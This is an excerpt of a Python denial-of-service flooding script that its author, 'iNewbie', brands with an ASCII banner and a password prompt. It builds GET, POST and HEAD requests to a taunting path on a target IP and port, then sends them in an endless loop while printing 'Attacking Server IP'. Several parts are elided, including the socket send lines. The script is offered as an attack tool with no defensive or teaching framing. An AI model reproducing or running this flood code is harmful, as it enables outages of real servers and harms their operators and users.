...
import time
import os
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By iNewbie [ What Password ]")
password = input("[ + ] Password : ")
if password == "iNewbieTools":
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By iNewbie [ DDoS Attack ]")
print("=======================================================================================")
print(" ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗      ██████╗ ██████╗  █████╗  ██████╗")
print("██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝╚██╗ ██╔╝      ██╔══██╗██╔══██╗██╔══██╗██╔════╝")
print("╚█████╗ ███████║███████║██████╔╝█████═╝  ╚████╔╝ █████╗██║  ██║██║  ██║██║  ██║╚█████╗ ")
...
print("╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝         ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝ ")
print("=======================================================================================")
print("[ + ] Author/Use : iNewbie")
print("[ + ] Update Tool: iNewbie")
print("==========================")
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_iNewbie_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_iNewbie_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_iNewbie_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[ + ] iNewbie Attacking Server IP => ",ip," In Port ",port,"!")
